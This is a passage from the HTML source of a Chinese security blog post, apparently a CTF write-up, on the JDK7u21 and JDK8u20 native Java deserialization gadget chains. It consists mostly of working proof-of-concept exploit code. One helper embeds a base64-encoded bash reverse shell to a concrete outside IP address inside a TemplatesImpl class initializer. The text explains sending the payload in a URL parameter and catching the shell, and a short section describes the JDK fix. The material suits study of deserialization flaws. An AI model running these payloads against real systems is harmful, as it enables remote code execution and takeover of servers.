obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="实战poc"><a class="markdownIt-Anchor" href="#实战poc"></a> 实战POC</h2>
+<h3 id="payload1"><a class="markdownIt-Anchor" href="#payload1"></a> payload1</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializeUtil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public static byte[] getEvilCode() throws Exception&#123;</span></span><br><span class="line"><span class="comment">//        ClassPool pool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//        CtClass clazzz = pool.get(&quot;EvilTest&quot;);</span></span><br><span class="line"><span class="comment">//        byte[] code = clazzz.toBytecode();</span></span><br><span class="line"><span class="comment">//        return code;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(o);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getTemplates() <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">template</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;MyTemplate&quot;</span>);</span><br><span class="line">        template.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">block</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0OC4yMTEuNDcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>;</span><br><span class="line"><span class="comment">//        String block = &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span></span><br><span class="line">        template.makeClassInitializer().insertBefore(block);</span><br><span class="line">        <span class="keyword">return</span> template.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload2"><a class="markdownIt-Anchor" href="#payload2"></a> payload2</h3>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        byte[] evilCode = SerializeUtil.getEvilCode();</span></span><br><span class="line">        <span class="type">byte</span>[] templates1 = SerializeUtil.getTemplates();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        SerializeUtil.setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;EncryptionUtil&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, Object&gt; memberValues = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        memberValues.put(<span class="string">&quot;f5a5a608&quot;</span>,<span class="string">&quot;feng&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)cons.newInstance(Templates.class, memberValues);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                Templates.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>,proxy);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>,templates);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>,templates);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>,proxy);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(map1, <span class="number">1</span>);</span><br><span class="line">        map.put(map2, <span class="number">2</span>);</span><br><span class="line"><span class="comment">//        HashSet set = new HashSet();</span></span><br><span class="line"><span class="comment">//        set.add(templates);</span></span><br><span class="line"><span class="comment">//        set.add(proxy);</span></span><br><span class="line">        SerializeUtil.setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;templates1&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = SerializeUtil.serialize(map);</span><br><span class="line">        System.out.println(Base64.encodeBase64String(bytes));</span><br><span class="line">        SerializeUtil.unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将生成的base64序列化数据进行url加密，防止url解码特殊符号报错，再传入p参数，监听反弹的shell</p>
+<p>题目好像没有bash反弹失败，用的sh成功反弹。</p>
+<h2 id="修复"><a class="markdownIt-Anchor" href="#修复"></a> 修复</h2>
+<p>之所以7U21能使用，最关键的一点就是由于<code>sun.reflect.annotation.AnnotationInvocationHandler</code>中的**<code>this.type</code>属性没有做限制**，导致可以是任何对象，但其实在<code>readObject</code>函数中，原本有一个对<code>this.type</code>的检查，在其不是<code>AnnotationType</code>的情况下，会抛出一个异常。但是，捕获到异常后没 有做任何事情，只是将这个函数返回了，这样并不影响整个反序列化的执行过程；在新版中，将 return; 修改成<code>throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</code> ，这样，反序列化时会出现一个异常，导致整个过程停止，我们就不能将<code>this.type</code>属性设置成我们前面说的恶意<code>TemplatesImpl</code>对象了</p>
+<p>只不过p神也说了，这个修复方式看起来击中要害，实际上仍然存在问题，这也导致后面的另一条原生利用链JDK8u20</p>
+<h2 id="8u20链"><a class="markdownIt-Anchor" href="#8u20链"></a> 8u20链</h2>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/jdk8u20-deserialization/#%E6%9C%80%E7%BB%88poc">Jdk8u20反序列化漏洞</a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Base.Unserialize.Jdk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> ysoserial.Serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.beans.beancontext.BeanContextSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdk8u20FinalPoc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(Base.Unserialize.Base.Evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanContextSupport</span> <span class="variable">bcs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanContextSupport</span>();</span><br><span class="line">        setFieldValue(bcs, <span class="string">&quot;serializable&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; modifiedHandlerClass = createModifiedHandlerClass();</span><br><span class="line">        Constructor&lt;?&gt; ctor = modifiedHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">ih</span> <span class="operator">=</span> (InvocationHandler) ctor.newInstance(Templates.class, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;());</span><br><span class="line"></span><br><span class="line">        setFieldValue(ih, <span class="string">&quot;type&quot;</span>, Templates.class);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; tmpMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        tmpMap.put(ih, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(bcs, <span class="string">&quot;children&quot;</span>, tmpMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Templates</span> <span class="variable">proxy</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(</span><br><span class="line">                jdk8u20FinalPoc.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                ih</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        LinkedHashSet&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;();</span><br><span class="line">        set.add(bcs);</span><br><span class="line">        set.add(templates);</span><br><span class="line">        set.add(proxy);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; memberValues = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        memberValues.put(<span class="string">&quot;f5a5a608&quot;</span>, templates);</span><br><span class="line">        setFieldValue(ih, <span class="string">&quot;memberValues&quot;</span>, memberValues);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> <span class="string">&quot;8u20.ser&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] ser = Serializer.serialize(set);</span><br><span class="line">        <span class="type">byte</span>[] shoudReplace = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x78</span>,<span class="number">0x70</span>,<span class="number">0x77</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x78</span>,<span class="number">0x71</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> findSubarray(ser, shoudReplace);</span><br><span class="line">        ser = deleteBytes(ser, i, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filename)) &#123;</span><br><span class="line">            fos.write(ser);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Class&lt;?&gt; createModifiedHandlerClass() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeObject</span> <span class="operator">=</span> CtMethod.make(</span><br><span class="line">                <span class="string">&quot;private void writeObject(java.io.ObjectOutputStream out) throws java.io.IOException &#123;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    out.defaultWriteObject();&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>, cc);</span><br><span class="line">        cc.addMethod(writeObject);</span><br><span class="line">        <span class="keyword">return</span> cc.toClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findSubarray</span><span class="params">(<span class="type">byte</span>[] array, <span class="type">byte</span>[] subarray)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= array.length - subarray.length; i++) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; subarray.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (array[i + j] != subarray[j]) &#123;</span><br><span class="line">                    match = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (match) <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] deleteBytes(<span class="type">byte</span>[] array, <span class="type">int</span> index, <span class="type">int</span> count) &#123;</span><br><span class="line">        <span class="type">byte</span>[] newArray = <span class="keyword">new</span> <span class="title class_">byte</span>[array.length - count];</span><br><span class="line">        System.arraycopy(array, <span class="number">0</span>, newArray, <span class="number">0</span>, index);</span><br><span class="line">        System.arraycopy(array, index + count, newArray, index, array.length - index - count);</span><br><span class="line">        <span class="keyword">return</span> newArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JAVA反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JDK%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">JDK原生反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="JAVA反序列化-toString新链及例题" class="lazyload">
+          
+        
+        <a href="/2025/09/30/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-toString%E6%96%B0%E9%93%BE%E5%8F%8A%E4%BE%8B%E9%A2%98/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JAVA反序列化-toString新链及例题
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="JAVA反序列化-高版本JDK下的Spring原生链" class="lazyload">
+        
+      
+      <a href="/2025/09/29/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%AB%98%E7%89%88%E6%9C%ACJDK%E4%B8%8B%E7%9A%84Spring%E5%8E%9F%E7%94%9F%E9%93%BE/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          JAVA反序列化-高版本JDK下的Spring原生链
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
